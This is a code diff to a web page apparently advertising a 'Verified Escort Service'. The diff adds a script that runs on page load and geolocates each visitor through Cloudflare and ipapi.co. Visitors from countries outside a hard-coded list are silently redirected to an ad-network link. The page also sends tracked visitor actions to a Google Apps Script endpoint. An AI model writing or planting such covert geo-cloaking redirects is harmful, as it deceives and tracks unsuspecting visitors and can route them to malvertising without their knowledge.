@@ -4,6 +4,43 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verified Escort Service</title>
+    
+    <script type="text/javascript">
+        (function() {
+            const fallbackLink = "https://www.effectivecpmnetwork.com/d9ddk3mpd?key=a83df7bf6b76513961a1bd323c24892b";
+
+            const allowedCountries = [
+                "US", "CA", "GB", "AU", "NZ", "DE", "FR", "IE",
+                "IT", "ES", "NL", "BE", "SE", "NO", "FI", "DK", "CH", "AT", "SG", "JP", "KR", "AE", "SA", "ZA", "IL"
+            ];
+
+            try {
+                fetch('https://www.cloudflare.com/cdn-cgi/trace')
+                .then(res => res.text())
+                .then(data => {
+                    let matches = data.match(/loc=([A-Z]{2})/);
+                    let userCountry = (matches && matches[1]) ? matches[1] : "";
+
+                    if (userCountry) {
+                        if (!allowedCountries.includes(userCountry)) {
+                            window.location.replace(fallbackLink);
+                        }
+                    }
+                }).catch(() => {
+                    fetch('https://ipapi.co/json/')
+                    .then(res => res.json())
+                    .then(json => {
+                        if (json.country_code && !allowedCountries.includes(json.country_code)) {
+                            window.location.replace(fallbackLink);
+                        }
+                    });
+                });
+            } catch (e) {
+                // Keep execution safe
+            }
+        })();
+    </script>
+
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body, html { height: 100%; overflow: hidden; background-color: #000; }
@@ -71,7 +108,6 @@
     </div>
 
     <script>
-        // আপনার দেওয়া নতুন গুগল অ্যাপস স্ক্রিপ্ট লিংক
         var SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyyap6ATxvesA9tvKVLK9zD-bnfyCqrTQGmwGo5kwgZ_aKQvGGg6QYRBAYSl_x_bgvO/exec";
 
         function trackEvent(actionName) {
